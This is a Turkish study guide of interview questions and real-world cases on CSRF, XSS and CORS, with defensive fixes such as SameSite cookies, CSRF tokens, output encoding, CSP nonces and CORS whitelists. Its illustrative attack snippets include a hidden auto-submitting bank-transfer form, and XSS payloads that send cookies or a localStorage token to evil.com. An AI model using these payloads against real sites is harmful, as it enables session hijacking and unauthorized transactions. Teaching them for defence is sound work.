# 09b — CSRF, XSS ve CORS: Mülakat Soruları & Gerçek Hayat Sorunları

---

## Bölüm 1: CSRF (Cross-Site Request Forgery)

### Gerçek Hayat Sorunları

---

**Sorun 1: SameSite=None cookie — evil.com üzerinden banka transferi**

```
Senaryo:
  mybank.com: eski sistem, cookie'lerde SameSite direktifi yok.
  Tarayıcı default: eski davranış → cross-site cookie gönder.

  Kullanıcı mybank.com'a giriş yaptı, session cookie'si var.
  Kullanıcı aynı anda email'deki linke tıkladı → evil.com açıldı.

  evil.com sayfasında gizli form:
  <form id="transfer" action="https://mybank.com/api/transfer" method="POST">
    <input name="to"     value="TR330006100519786457841326">
    <input name="amount" value="50000">
  </form>
  <script>document.getElementById('transfer').submit();</script>

  Tarayıcı:
    POST https://mybank.com/api/transfer
    Cookie: sessionId=user-valid-session  ← otomatik ekledi!
    Body: to=TR33...&amount=50000

  Server: "sessionId geçerli → işlem yaptım."
  Kullanıcı haberdar bile olmadı.

SameSite ile düzeltme:
  Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

  SameSite=Strict:
    evil.com → mybank.com POST → cookie gönderilmez → 401 Unauthorized.
    Sorun: mybank.com'a başka siteden link tıklandığında da cookie gitmez.
    Kullanıcı linke tıkladı → mybank.com → "lütfen tekrar giriş yapın."
    UX kötü ama maksimum güvenlik.

  SameSite=Lax (genellikle yeterli):
    GET cross-site: cookie gönderilir (navigation, link tıklama).
    POST/PUT/DELETE cross-site: cookie gönderilmez.
    Para transferi POST → engellendi. ✓
    Kullanıcı linke tıklayıp mybank.com'a giderse → cookie gider → sorunsuz. ✓
    Çoğu uygulama için Lax optimum denge.

  SameSite=None; Secure:
    3. taraf iFrame veya ödeme widget'ı için zorunlu.
    Sadece HTTPS + ek CSRF token zorunlu.
```

---

**Sorun 2: REST API'de CSRF token kaldırıldı ama cookie-based auth bırakıldı**

```
Senaryo:
  Ekip: "Biz REST API yazıyoruz, CSRF token'a gerek yok dedik."
  Gerçek: oturum yönetimi hâlâ cookie tabanlı!

  Backend:
    Set-Cookie: JSESSIONID=abc; HttpOnly; Secure
    // CSRF koruması kaldırıldı (csrf().disable())

  Yanılgı: "REST = stateless = CSRF yok"
  Doğru: cookie-based session varsa → CSRF riski var! Stateless değil.

  Saldırı:
    Kullanıcı uygulamaya giriş yaptı → JSESSIONID cookie var.
    evil.com: fetch("https://api.myapp.com/user/delete", {method: "DELETE"})
    Tarayıcı: JSESSIONID cookie → otomatik ekledi.
    Server: session geçerli → kullanıcı silindi!

  Fark:
    JWT Bearer token: Authorization: Bearer xyz → tarayıcı EKLEMEZ.
    evil.com JS → başka origin'in localStorage/header'ına SOP nedeniyle erişemez.
    CSRF imkansız. Bu durumda csrf().disable() doğru.

    Session cookie: tarayıcı OTOMATIK ekler → CSRF mümkün.
    csrf().disable() → güvenlik açığı!

Doğru karar ağacı:
  Auth mekanizması nedir?
  ├── JWT Bearer header → csrf().disable() güvenli
  └── Session cookie (JSESSIONID, PHPSESSID) →
      ├── SameSite=Strict/Lax → ÇOĞU DURUMDA yeterli
      └── + CSRF Token → maksimum güvenlik

Spring Security doğru konfigürasyon (cookie-based):
  http.csrf(csrf -> csrf
      .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
  );
  // XSRF-TOKEN cookie → JavaScript okur → X-XSRF-TOKEN header'ına koyar.
  // evil.com: SOP → mybank.com cookie'sini okuyamaz → token'ı header'a koyamaz.
```

---

**Sorun 3: CSRF token'ı GET isteğiyle URL'ye koyma — Referer header'ından sızdı**

```
Senaryo:
  Yanlış implementasyon: CSRF token URL query param olarak gönderiliyor.

  GET /dashboard?_csrf=abc123def456

  Sorunlar:
    1. Browser history: URL → geçmişe kaydedildi → başkası cihazı açtı.
    2. Referer header: kullanıcı sayfadan harici linke tıklarsa →
       GET https://external-analytics.com/track
       Referer: https://myapp.com/dashboard?_csrf=abc123def456
       → analytics servisi CSRF token'ı gördü!
    3. Server log: access log'a URL yazıldı → token log'da.
    4. Proxy/CDN cache: URL'deki CSRF token → farklı kullanıcıya cache dönebilir.

Doğru yöntemler:
  1. Hidden form field (form submit için):
     <input type="hidden" name="_csrf" value="abc123">
     POST body'de → URL'de değil, log'da görünmez.

  2. Request header (AJAX için):
     X-XSRF-TOKEN: abc123
     Header → URL'de değil, Referer'da yok.

  // Axios otomatik entegrasyon:
  axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
  axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
  // Cookie'den okur, header'a koyar, otomatik.

  CSRF token özellikleri:
    Cryptographically random (SecureRandom, min 128 bit).
    Session'a bağlı (per-session token yeterli, per-request daha güvenli ama komplex).
    Expire süresi: session ile aynı ömür.
    Timing-safe karşılaştırma (MessageDigest.isEqual — string equals değil!).
```

---

## Bölüm 2: XSS (Cross-Site Scripting)

### Gerçek Hayat Sorunları

---

**Sorun 4: Stored XSS — yorum alanından session hijacking**

```
Senaryo:
  E-ticaret sitesi: ürün yorumları DB'ye kaydediliyor.
  Template: <div class="comment">${comment.text}</div>
  Sanitizasyon yok, escape yok.

  Saldırgan yorum olarak yazıyor:
  <script>
    var img = new Image();
    img.src = "https://evil.com/steal?c=" + encodeURIComponent(document.cookie);
  </script>

  DB'ye kaydedildi. Ürün sayfasını açan her kullanıcı için:
    Tarayıcı script'i çalıştırır.
    document.cookie → JSESSIONID=abc123 (HttpOnly değilse!).
    evil.com'a istek gönderilir.
    Saldırgan: session ID'yi kendi tarayıcısına koyar → kurbanın hesabına giriş.

  Admin panelde gösterilirse: admin cookie çalınır → tam yetki.

  Gerçek zarar:
    2005 Samy worm (MySpace): Stored XSS → 1 milyon profil 20 saatte.
    2014 eBay XSS: üyelerin cookie'leri çalındı.
    2018 British Airways: XSS + skimmer → 500,000 kart verisi.

Düzeltme katmanları:
  1. Output encoding (temel):
     // Thymeleaf
     <div class="comment" th:text="${comment.text}"></div>
     // th:text → HTML escape eder: < → &lt; > → &gt; " → &quot;

     // Java manuel
     String safe = HtmlUtils.htmlEscape(comment.getText());

  2. HttpOnly cookie (XSS başarılı olsa bile cookie çalamaz):
     Set-Cookie: JSESSIONID=abc; HttpOnly; Secure; SameSite=Strict
     document.cookie → "" (boş) → JSESSIONID görünmez.

  3. CSP header (inline script'i engeller):
     Content-Security-Policy: default-src 'self'; script-src 'self'
     <script>...</script> → CSP engeller → çalışmaz.

  4. HTML içeriğe izin veriliyorsa → sanitize (encode değil):
     PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
     String safe = policy.sanitize(userHtml);
     // <script> → kaldırıldı, <b> → bırakıldı.
```

---

**Sorun 5: DOM-based XSS — innerHTML + URL parametresi**

```
Senaryo:
  SPA (Single Page Application), React/Angular değil vanilla JS:

  // Tehlikeli kod
  const query = new URLSearchParams(window.location.search).get('search');
  document.getElementById('results').innerHTML = 
      `<p>${query} için arama sonuçları:</p>`;

  URL: https://myapp.com/search?search=<img src=x onerror="stealData()">

  Tarayıcı innerHTML'e yazınca:
    <img src=x onerror="stealData()"> → img yüklenemez → onerror çalışır.
    stealData(): fetch('evil.com?d='+localStorage.getItem('authToken'))
    localStorage'da JWT varsa → çalındı!
    Not: HttpOnly cookie çalınamaz ama localStorage tamamen açık.

  DOM-based XSS'in farkı:
    Server response'da zararlı içerik YOK.
    WAF veya server-side encoding → yakalamaz.
    Tamamen client-side → sadece client-side fix gerekli.

Düzeltme:
  // YANLIŞ
  element.innerHTML = userInput;        // script/event handler çalışabilir

  // DOĞRU — textContent (HTML parse etmez)
  element.textContent = userInput;      // düz metin, güvenli

  // DOĞRU — DOM API (güvenli node oluşturma)
  const p = document.createElement('p');
  p.textContent = query + ' için arama sonuçları:';
  document.getElementById('results').appendChild(p);

  React/Angular güvenli default:
    React: JSX → {userInput} → otomatik escape. Güvenli.
    dangerouslySetInnerHTML → kaçın (adında "dangerous" var!).
    Angular: {{ userInput }} → güvenli. [innerHTML] → DomSanitizer gerekli.

  CSP katkısı:
    'unsafe-inline' yok → onerror gibi event handler'lar engellenir.
    script-src 'self' → inline event yok.
    Ama DOM manipülasyonu (textContent değişikliği) CSP engelleyemez.
    → İkisi tamamlayıcı, biri yerine geçmez.
```

---

**Sorun 6: CSP header'ı yanlış yapılandırıldı — unsafe-inline + XSS bypass**

```
Senaryo:
  Ekip CSP header ekledi ama çalışmıyordu:
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

  'unsafe-inline': tüm inline script'lere izin ver.
  Sonuç: XSS payload'ları inline script olduğu için → CSP hiçbir şey engellemedi!
  CSP varmış gibi gözüküyor, koruma yok.

  Ayrıca sık yapılan hatalar:
    script-src *: tüm harici domain'lerden script. XSS bypass için CDN kullanılır.
    script-src https: → tüm HTTPS kaynaklı script → evil.com HTTPS'e geçerse → izinli!
    object-src eksik: Flash/PDF plugin → XSS vektörü.

Doğru CSP:
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://cdn.trusted.com 'nonce-{randomNonce}';
    style-src 'self' 'unsafe-inline';   // style inline genelde gerekli
    img-src 'self' data: https:;
    object-src 'none';                  // Flash/plugin yasak
    frame-ancestors 'none';             // Clickjacking önlemi (X-Frame-Options yerine)
    base-uri 'self';                    // base tag injection önlemi
    upgrade-insecure-requests;          // HTTP → HTTPS otomatik

  Nonce ile inline script izni (unsafe-inline yerine):
    Server: her response'da yeni random nonce üret.
    CSP header: script-src 'nonce-abc123xyz'
    HTML: <script nonce="abc123xyz">legitimCode()</script>
    XSS payload: <script>evil()</script> → nonce yok → engellendi!
    Saldırgan nonce değerini bilemez (her request'te yeni, random).

  CSP test:
    Content-Security-Policy-Report-Only: ... ; report-uri /csp-report
    → Önce report modunda → ihlalleri topla → düzelt → enforce et.
    Production'da aniden Enforce → meşru scriptleri kırar.
```

---

## Bölüm 3: CORS

### Gerçek Hayat Sorunları

---

**Sorun 7: `Access-Control-Allow-Origin: *` + credentials — bilgi sızıntısı**

```
Senaryo:
  Internal API: hızlıca geliştirme için wildcard CORS açıldı.
  
  @CrossOrigin(origins = "*")  // YANLIŞ
  @GetMapping("/api/user/profile")
  public UserProfile getProfile() { ... }

  Ayrıca: credentials: true ile istek atılıyor.

  Sorun 1 (Tarayıcı engeli):
    Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true
    Tarayıcı: bu kombinasyonu reddeder.
    "Credentials can't be used with wildcard origin" hatası.

  Sorun 2 (Credentials olmadan ama hâlâ riskli):
    Authenticated API ise wildcard pek sorun olmaz (401 döner).
    Ama public veri içeriyorsa → herkes çapraz origin'den okuyabilir.
    Internal API: intranet → wildcard → dışarıdan (SSRF ile) erişilebilir.
    
  Sorun 3 (Origin yansıtma — en tehlikeli):
    // Yanlış "dynamic" CORS
    String origin = request.getHeader("Origin");
    if (origin != null) {
        response.addHeader("Access-Control-Allow-Origin", origin); // HER şeye izin!
    }
    response.addHeader("Access-Control-Allow-Credentials", "true");

    Saldırı:
      evil.com: fetch("https://api.myapp.com/user/data", {credentials: 'include'})
      Origin: https://evil.com
      Server: "Origin header var → izin ver!"
      → evil.com kullanıcının verisini okudu.

Doğru CORS:
  config.setAllowedOrigins(List.of(
      "https://app.mycompany.com",
      "https://admin.mycompany.com"
  ));
  // Whitelist — sadece tanınan domainler.

  Subdomain wildcard (dikkatli):
    // Regex ile kontrol — tam match zorunlu:
    Pattern pattern = Pattern.compile("https://[a-z]+\\.mycompany\\.com");
    if (pattern.matcher(origin).matches()) {
        // izin ver
    }
    // DİKKAT: https://mycompany.com.evil.com → eşleşmesin!
    // mycompany\\.com (escape) → mycompany.com.evil.com eşleşmez. Doğru.
```

---

**Sorun 8: CORS preflight cache eksikliği — her istek iki HTTP isteğe dönüştü**

```
Senaryo:
  Mobil/web uygulaması: her API isteği önce OPTIONS → sonra asıl istek.
  Preflight cache (Access-Control-Max-Age) ayarlanmamış → default 5 saniye.

  Sonuç:
    Her PUT/DELETE isteği → 2 HTTP request.
    1 milyon API çağrısı/gün → 2 milyon HTTP request.
    Latency: her request ek RTT (Round Trip Time).
    Server load: OPTIONS handler %50 ekstra.

  Monitoring:
    API gateway log: OPTIONS istekleri %45 oranında.
    Ortalama response süre: 250ms → 400ms (preflight nedeniyle).

Düzeltme:
  config.setMaxAge(3600L);  // 1 saat — preflight sonucu cache

  Tarayıcı: OPTIONS → cevap cache → 1 saat boyunca OPTIONS atmaz.
  Sonuç: 2 milyon → ~1 milyon request/gün.
  Latency: geri normale döndü.

  Max-Age sınırları:
    Chrome: max 7200 saniye (2 saat) üstünü ignore eder.
    Firefox: max 86400 saniye (24 saat).
    Güvenlik tradeoff: uzun cache → origin değişikliği hemen yansımaz.
    Önerilen: 1 saat (3600) — denge.

  Simple request ile preflight'tan kaçınma:
    Sadece GET/POST + form content types → preflight yok.
    Authorization header → preflight tetikler (önlem yok).
    Content-Type: application/json → preflight tetikler.
    → API tasarımında bilinçli seçim, preflight kaçınılmaz.
```

---

### Mülakat Soruları

**Junior / Mid:**

1. CSRF saldırısı nasıl çalışır? SameSite cookie bunu nasıl önler?

   > **Beklened:** CSRF: kullanıcı siteye giriş yapıp cookie almış. Saldırgan başka sitede gizli form veya JS ile o siteye istek attırır. Tarayıcı cookie'leri same-site request'lerde otomatik ekler. Server "cookie geçerli → işlem yap" → kullanıcının bilgisi olmadan işlem gerçekleşti. Neden çalışır: tarayıcı cookie'leri otomatik ekler, evil.com'un JS'i doğrudan cookie oluşturmaz sadece varolan cookie gönderilir. SameSite önleme: `SameSite=Strict` → cross-site hiçbir istekte cookie gönderilmez. `SameSite=Lax` → GET cross-site gider (link tıklama), POST/DELETE gitmez → form tabanlı CSRF engellenir. `SameSite=None; Secure` → her zaman gönderilir (3rd party iFrame için). Lax çoğu uygulama için yeterli: para transferi POST → evil.com'dan → cookie gitmez → 401. CSRF token ek katman: hidden field veya header olarak token → server doğrular. evil.com SOP nedeniyle token'ı okuyamaz → header'a koyamaz → reddedilir.

2. XSS'in 3 türü nedir? Aralarındaki fark ne?

   > **Beklened:** Stored (Kalıcı): zararlı script DB'ye kaydedilir. Forum yorumu, profil bilgisi. Sayfayı açan herkes için çalışır. En tehlikeli — hedef kitlesi geniş. Reflected (Yansıtılmış): script URL parametresinde, server response'a yansıtır. Kurban linke tıklamalı. Sosyal mühendislik gerekir. Arama kutusu, hata mesajları. Tek oturum etkisi. DOM-based: tamamen client-side. Server response'da zararlı içerik yok. `innerHTML = location.search.get('q')` → URL'deki script DOM'a enjekte. WAF ve server-side koruma yakalamaz. React'ta {userInput} güvenli, dangerouslySetInnerHTML tehlikeli. Ortak zarar: XSS başarılıysa — cookie çalma (HttpOnly yoksa), localStorage/sessionStorage okuma (JWT gibi token'lar), tuş kaydı, kullanıcı adına istek, phishing formu enjekte. Önlem: output encoding (context'e göre: HTML, JS, URL), HttpOnly cookie, CSP header.

3. CORS nedir? Preflight request ne zaman tetiklenir?

   > **Beklened:** SOP (Same-Origin Policy): tarayıcı, farklı origin'e JS ile istek atabilir ama response'u okuyamaz. Origin = protokol + domain + port. CORS: server "bu origin'e izin veriyorum" diyor → `Access-Control-Allow-Origin` header. Tarayıcı bunu görünce response'u scripte verir. Simple request (preflight yok): GET veya POST + form content types (application/x-www-form-urlencoded, multipart/form-data) + özel header yok. Preflight tetikleyen: PUT, DELETE, PATCH veya POST + `Content-Type: application/json` veya custom header (`Authorization`, `X-Request-ID`). Preflight: tarayıcı önce OPTIONS → server izin verirse asıl request. `Access-Control-Max-Age` ile cache → tekrar OPTIONS atılmaz. Güvenlik notu: CORS tarayıcı güvenliği — server-to-server'ı engellemez! curl/Postman → CORS bypass. Sadece browser JS'in cross-origin okumasını engeller.

4. `Access-Control-Allow-Origin: *` ne zaman tehlikelidir?

   > **Beklened:** Wildcard (*) + credentials: tarayıcı reddeder — bu kombinasyon geçersiz. Ama tek başına wildcard sorunları: (1) Authenticated olmayan public veri: zararlı değil. (2) Auth gerektiren ama wildcard: 401 döner ama header var — credentials false ise bile güvenlik algısı yanıltıcı. (3) En tehlikeli — origin yansıtma: `String origin = request.getHeader("Origin"); response.addHeader("ACAO", origin);` → her domain'e izin ver → evil.com + credentials → veri sızdı. (4) Internal API + wildcard: intranet servis, dışarıdan SSRF ile erişilirse wildcard → cross-origin okuma. Doğru: explicit whitelist. `config.setAllowedOrigins(List.of("https://app.myco.com"))`. Development: localhost:3000 ekle, production'da kaldır. Wildcard sadece gerçekten public, kimlik doğrulama gerektirmeyen CDN veya public API için kullan.

---

**Senior / Architect:**

5. JWT Bearer token kullanıyorsak neden CSRF riski yok? Cookie-based auth ile farkı?

   > **Beklened:** Tarayıcı davranışı: cookie → her request'te otomatik eklenir (CSRF riski). Bearer token → Authorization header → tarayıcı EKLEMEZ, JS eklemeli. CSRF saldırısı: evil.com'dan form submit → cookie otomatik gider → server kabul eder. evil.com'dan JWT Bearer: JS, localStorage'dan token okur → `fetch("api...", {headers: {Authorization: "Bearer "+token}})`. SOP: evil.com, myapp.com'un localStorage'ını okuyamaz → token'ı bilemez → header'a koyamaz. Sonuç: JWT + Authorization header → CSRF imkansız → `csrf().disable()` doğru. AMA dikkat: JWT'yi cookie'de saklıyorsan → CSRF riski geri döner! localStorage'da JWT: CSRF yok ama XSS riski → XSS ile token çalınır, session invalidation zor. HttpOnly cookie'de JWT: XSS ile çalınamaz ama CSRF riski → SameSite + CSRF token gerekli. Karar: güvenlik modeli neyi önceliyor? XSS mı, CSRF mı?

6. Derinlemesine savunma (defense in depth) olarak CSRF + XSS + CORS birlikte nasıl yapılandırılır?

   > **Beklened:** Tek önlem yetmez — katmanlar birbirini tamamlar. CSRF katmanı: SameSite=Lax (birincil) + CSRF Token (ikincil). Cookie-based app için ikisi birlikte. JWT Bearer → CSRF yok, sadece XSS'e odaklan. XSS katmanı: (1) Output encoding — Thymeleaf th:text, React {expr}. (2) HttpOnly cookie — XSS başarılı olsa cookie çalamaz. (3) CSP header — inline script engeli, harici kaynak whitelist. (4) HTML sanitizer — zengin içeriğe izin varsa. CORS katmanı: strict whitelist origin. credentials: true ise * yasak. preflight cache. Birlikte senaryo: XSS başarılı → HttpOnly cookie koruyor (cookie çalınamaz). Session yok ama localStorage var → JWT çalınabilir → CORS ile cross-origin isteği tarayıcı bloklar ama aynı origin'den çalıştırılan kod bloklanmaz → CSP nonce → inline script engeli. Özetle: her katman bir öncekinin gözden kaçırdığını yakalar. Birinin bypass edilmesi tüm sistemi çökertmemeli.
